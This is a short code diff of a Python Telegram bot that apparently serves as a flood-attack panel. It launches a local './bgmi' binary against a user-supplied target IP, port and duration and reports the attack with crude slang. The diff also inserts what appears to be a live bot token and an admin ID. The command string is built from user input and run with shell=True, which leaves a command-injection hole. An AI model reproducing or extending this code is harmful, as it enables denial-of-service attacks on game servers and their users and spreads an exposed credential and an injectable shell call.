@@ -10,9 +10,9 @@ from keep_alive import keep_alive
 keep_alive()
 
 # Insert your Telegram bot token here
-bot = telebot.TeleBot('TOKEM')
+bot = telebot.TeleBot('6613663984:AAE14Ti91Fd49e2DHMN95UAJZ9MVNWiMgds')
 # Admin user IDs
-admin_id = {"5588464519"}
+admin_id = {"1400460665"}
 
 # Files for data storage
 USER_FILE = "users.json"
@@ -194,7 +194,7 @@ def handle_bgmi(message):
                     start_attack_reply(message, target, port, time)
                     full_command = f"./bgmi {target} {port} {time} 500"
                     subprocess.run(full_command, shell=True)
-                    response = f"𝐂𝐇𝐔𝐃𝐀𝐈 𝐒𝐓𝐀𝐑𝐓𝐄𝐃🎮\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
+                    response = f"𝐂𝐇𝐔𝐃𝐀𝐈 DONE🔥\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬"
             except ValueError:
                 response = "𝐄𝐑𝐑𝐎𝐑»𝐈𝐏 𝐏𝐎𝐑𝐓 𝐓𝐇𝐈𝐊 𝐒𝐄 𝐃𝐀𝐀𝐋 𝐂𝐇𝐔𝐓𝐘𝐄"
         else:
